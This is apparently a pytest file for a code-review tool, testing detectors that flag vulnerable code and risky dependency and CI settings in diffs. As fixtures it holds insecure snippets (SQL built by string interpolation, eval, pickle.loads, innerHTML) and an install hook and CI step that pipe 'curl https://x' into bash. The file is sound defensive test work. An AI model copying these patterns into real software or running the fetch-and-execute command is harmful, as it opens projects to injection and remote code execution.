from types import SimpleNamespace

import pytest

from reviewforge.core.specs import build_registry
from reviewforge.core.state import ReviewTask, StateStore
from reviewforge.engine.detectors import detect_dependency_findings, detect_security_findings
from reviewforge.engine.reviewers import SecurityReviewer
from reviewforge.tools.gateway import ToolGateway


def _diff(content: str) -> str:
    return "@@ test @@\n" + "\n".join("+" + line for line in content.splitlines())


def _cats(findings):
    return {f.category for f in findings}


def test_security_detector_covers_core_languages():
    findings = detect_security_findings(
        {
            "app.py": _diff('query = f"SELECT * FROM users WHERE id = {user_id}"\nreturn pickle.loads(blob)'),
            "web.js": _diff("eval(input)\ndocument.body.innerHTML = input\nchild_process.exec(cmd)"),
            "cmp.ts": _diff("sanitizer.bypassSecurityTrustHtml(html)\nsessionStorage.setItem('token', token)"),
            "view.vue": _diff('<div v-html="bio"></div>\n<component :is="name" />'),
            "view.svelte": _diff("<script>console.log(document.cookie)</script>\n<div>{@html html}</div>"),
            "main.go": _diff('query := fmt.Sprintf("SELECT * FROM users WHERE id=%s", id)\nexec.Command(cmd)'),
            "User.java": _diff("Runtime.getRuntime().exec(cmd)\nStatement stmt = c.createStatement();"),
            "pay.rb": _diff('eval(params[:code])\nsystem("notify #{email}")\nMarshal.load(raw)'),
            "lib.rs": _diff("Command::new(cmd).output().unwrap()\nunsafe { std::mem::transmute::<[u8; 4], u32>(buf) }"),
        }
    )

    assert {
        "sql-injection",
        "insecure-deserialization",
        "code-injection",
        "xss",
        "command-injection",
        "xss-bypass",
        "data-leak",
        "unsafe-block",
        "unsafe-transmute",
        "unsafe-usage",
    } <= _cats(findings)


def test_dependency_detector_covers_manifests_and_ci_without_exact_pin_noise():
    findings = detect_dependency_findings(
        {
            "requirements.txt": _diff("requests==2.31.0\nflask>=2.0\nunsafe-lib==*"),
            "package.json": _diff('{"scripts":{"postinstall":"curl https://x | bash"},"dependencies":{"a":"^1.0.0"}}'),
            ".github/workflows/build.yml": _diff(
                "- uses: actions/checkout@main\n- uses: actions/setup-node@v4\n- run: curl https://x | bash"
            ),
        }
    )

    cats = _cats(findings)
    assert "dependency-version-range" in cats
    assert "supply-chain-risk" in cats
    assert "ci-security" in cats
    req_findings = [f for f in findings if f.file == "requirements.txt"]
    assert len([f for f in req_findings if f.category == "dependency-version-range"]) == 2


class EmptyLLM:
    async def ainvoke(self, _messages):
        return SimpleNamespace(content='{"findings":[]}')


class DiffGitHub:
    async def get_file_diff(self, _repo, _pr_number, file_path):
        assert file_path == "app.py"
        return _diff("def run(expr):\n    return eval(expr)")

    async def get_file_content(self, _repo, _ref, _file_path):
        return ""

    async def search_code(self, _repo, _pattern, _file_glob=""):
        return ""

    async def post_review_comment(self, **_kwargs):
        return {"id": 1}


@pytest.mark.asyncio
async def test_security_reviewer_merges_deterministic_detector_findings():
    registry = build_registry()
    reviewer = SecurityReviewer(EmptyLLM(), registry, ToolGateway(registry, DiffGitHub()))
    state = StateStore(repo="o/r", pr_number=1, head_sha="h", files_changed=["app.py"])

    findings = await reviewer.execute(ReviewTask(reviewer="security_reviewer", files=["app.py"]), state)

    assert [f.category for f in findings] == ["code-injection"]
    assert findings[0].reviewer == "security_reviewer"
    assert findings[0].verified_by == "detector"
